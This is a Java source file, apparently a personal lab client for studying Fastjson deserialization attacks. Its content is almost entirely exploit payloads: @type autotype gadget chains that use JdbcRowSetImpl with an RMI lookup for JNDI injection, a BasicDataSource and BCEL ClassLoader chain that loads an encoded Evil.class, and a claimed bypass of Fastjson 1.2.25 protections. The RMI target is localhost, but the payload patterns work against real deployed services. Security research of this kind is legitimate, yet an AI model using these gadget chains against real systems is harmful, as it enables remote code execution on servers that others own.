package com.endlessshw.fastjsonprinciple.client;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.springframework.util.FileCopyUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.sql.SQLException;

/**
 * @author hasee
 * @version 1.0
 * @description: TODO
 * @date 2023/5/15 11:07
 */
public class Fastjson1_2_24 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {
        // 有版本限制、依赖限制、而且需要出网
        // JdbcRowSetImplGadget();

        // 8u251 之前
        // ClassLoaderGadget();

        // 1.2.25 绕过
        Bypass1_2_25_JNDI();
        // Bypass1_2_25_BCEL();
    }

    private static void Bypass1_2_25_JNDI() {
        String payload = "{{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"AutoCommit\":false}}";
        JSON.parse(payload);
    }

    /**
     * 失败
     * @throws IOException
     */
    private static void Bypass1_2_25_BCEL() throws IOException {
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = fileToBinArray(new File("target/classes/Evil.class"));
        String code = Utility.encode(bytes, true);

        String payload = "{{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
                "{\"@type\":\"java.lang.Class\", \"val\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"}," +
                "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"," +
                    "\"DriverClassName\":\"$$BCEL$$" + code + "\"," +
                    "\"DriverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}}";
        JSONObject jsonObject = JSON.parseObject(payload);
    }

    private static void ClassLoaderGadget() throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {
        // com.sun.org.apache.bcel.internal.util.ClassLoader 的基本的使用方法
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = fileToBinArray(new File("target/classes/Evil.class"));
        String code = Utility.encode(bytes, true);
        // classLoader.loadClass("$$BCEL$$" + code).newInstance();

        // BasicDataSource basicDataSource = new BasicDataSource();
        // basicDataSource.setDriverClassLoader(classLoader);
        // basicDataSource.setDriverClassName("$$BCEL$$" + code);
        // basicDataSource.getConnection();

        // payload
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"," +
                "\"DriverClassName\":\"$$BCEL$$" + code + "\"," +
                "\"DriverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        JSONObject jsonObject = JSON.parseObject(payload);

    }

    /**
     * 文件转字节码数组
     * @param file
     * @return
     */
    private static byte[] fileToBinArray(File file) {
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            return FileCopyUtils.copyToByteArray(fileInputStream);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static void JdbcRowSetImplGadget() {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"AutoCommit\":false}";
        JSON.parse(payload);
    }
}
